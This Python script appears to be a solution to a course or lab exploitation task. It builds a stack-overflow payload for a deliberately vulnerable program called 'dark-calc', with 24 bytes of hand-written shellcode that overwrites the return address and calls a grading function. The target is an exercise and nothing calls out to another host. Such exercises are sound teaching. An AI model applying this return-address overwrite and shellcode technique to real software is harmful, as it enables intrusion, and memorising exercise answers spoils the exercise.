#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc (stack code execution).

``dark-calc`` maps a private stack at a fixed address (see ``init_fixed_stack``
and ``__wrap_main`` in the disassembly) and maps those pages RWX, so we can put
real machine code into ``expression[]`` and jump to it.

Frame layout of ``input()``:

    rbp-0x10 : char expression[16]      <- our shell code
    rbp+0x00 : saved rbp                <- more shell code (8 bytes)
    rbp+0x08 : return address           <- 0x721000800fd0 = &expression[0]

The stack top installed by ``__wrap_main`` is 0x721000801000, hence

    main   : rbp = 0x721000800ff0
    input  : rbp = 0x721000800fe0
    expression = rbp-0x10 = 0x721000800fd0

The shell code is exactly 24 bytes (the space between expression[] and the
saved return address) and does:

    sub  rsp, 0x38         ; move the stack below our own code, keep alignment
    push 0x401ac3          ; return address = main (clean way to exit)
    push 0x4019d6          ; "ret" gadget (one more stack slot, for alignment)
    push 4 ; pop rdi       ; grade = 4
    mov  eax, 0x401a87     ; &grade_eval
    jmp  rax               ; grade_eval(4)

``grade_eval(4)`` prints "Hope A will be your grade!", returns through the
"ret" gadget into ``main``, which reads EOF from stdin, so ``input()`` prints
the "empty expression" answer and exits with status 0.
"""
import struct
import sys

EXPRESSION = 0x721000800FD0  # address of expression[0] inside dark-calc
GRADE_EVAL = 0x401A87
MAIN = 0x401AC3
RET_GADGET = 0x4019D6        # plain "ret" (end of input())

shellcode = bytes(
    [
        0x48, 0x83, 0xEC, 0x38,                # sub  rsp, 0x38
        0x68, 0xC3, 0x1A, 0x40, 0x00,          # push main
        0x68, 0xD6, 0x19, 0x40, 0x00,          # push ret gadget
        0x6A, 0x04, 0x5F,                      # push 4 ; pop rdi
        0xB8, 0x87, 0x1A, 0x40, 0x00,          # mov  eax, grade_eval
        0xFF, 0xE0,                            # jmp  rax
    ]
)

assert len(shellcode) == 24
assert b"\n" not in shellcode
payload = shellcode + struct.pack("<Q", EXPRESSION)

sys.stdout.buffer.write(payload + b"\n")
